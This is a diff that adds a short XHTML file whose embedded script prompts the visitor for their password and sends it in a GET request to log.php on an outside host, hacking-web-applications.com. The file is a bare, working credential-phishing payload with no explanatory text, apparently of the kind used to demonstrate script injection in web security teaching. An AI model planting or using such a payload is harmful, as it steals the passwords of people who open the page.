@@ -1,0 +1,9 @@
+<xhtml:html
+xmlns:xhtml="http://www.w3.org/1999/xhtml">
+  <xhtml:script>
+    var pass = prompt("Enter your password to continue");
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://hacking-web-applications.com/log.php?pass="+encodeURI(pass));
+    xhr.send();
+  </xhtml:script>
+</xhtml:html>
